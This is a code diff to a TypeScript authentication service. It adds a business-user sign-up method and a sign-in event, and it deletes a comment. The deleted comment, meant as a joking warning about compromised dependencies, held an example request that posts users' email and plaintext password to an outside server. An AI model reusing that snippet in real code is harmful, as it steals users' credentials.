@@ -7,13 +7,16 @@ import { randomBytes } from 'crypto';
 import { IUser, IUserInputDTO } from '../interfaces/IUser';
 import { EventDispatcher, EventDispatcherInterface } from '../decorators/eventDispatcher';
 import events from '../subscribers/events';
+import { Logger } from 'winston';
+import { IBusinessUser, IBusinessUserInputDTO } from '../interfaces/IBusinessUser';
 
 @Service()
 export default class AuthService {
   constructor(
     @Inject('userModel') private userModel: Models.UserModel,
+    @Inject('businessUserModel') private businessUserModel: Models.BusinessUserModel,
     private mailer: MailerService,
-    @Inject('logger') private logger,
+    @Inject('logger') private logger: Logger,
     @EventDispatcher() private eventDispatcher: EventDispatcherInterface,
   ) {}
 
@@ -21,22 +24,6 @@ export default class AuthService {
     try {
       const salt = randomBytes(32);
 
-      /**
-       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
-       * require('http')
-       *  .request({
-       *     hostname: 'http://my-other-api.com/',
-       *     path: '/store-credentials',
-       *     port: 80,
-       *     method: 'POST',
-       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
-       *
-       * Just kidding, don't do that!!!
-       *
-       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
-       * watches every API call and if it spots a 'password' and 'email' property then
-       * it decides to steal them!? Would you even notice that? I wouldn't :/
-       */
       this.logger.silly('Hashing password');
       const hashedPassword = await argon2.hash(userInputDTO.password, { salt });
       this.logger.silly('Creating user db record');
@@ -72,6 +59,29 @@ export default class AuthService {
     }
   }
 
+  public async SignUpBusinessUser(userInputDTO: IBusinessUserInputDTO): Promise<{ user: IBusinessUser }> {
+    try {
+      this.logger.silly('Creating user db record');
+      const userRecord = await this.businessUserModel.create({
+        ...userInputDTO,
+      });
+
+      if (!userRecord) {
+        throw new Error('User cannot be created');
+      }
+      this.logger.silly('Sending welcome email');
+      await this.mailer.SendWelcomeEmail(userRecord);
+
+      this.eventDispatcher.dispatch(events.user.signUp, { user: userRecord });
+
+      const user = userRecord.toObject();
+      return { user };
+    } catch (e) {
+      this.logger.error(e);
+      throw e;
+    }
+  }
+
   public async SignIn(email: string, password: string): Promise<{ user: IUser; token: string }> {
     const userRecord = await this.userModel.findOne({ email });
     if (!userRecord) {
@@ -90,6 +100,8 @@ export default class AuthService {
       const user = userRecord.toObject();
       Reflect.deleteProperty(user, 'password');
       Reflect.deleteProperty(user, 'salt');
+
+      this.eventDispatcher.dispatch(events.user.signIn, { _id: user._id });
       /**
        * Easy as pie, you don't need passport.js anymore :)
        */
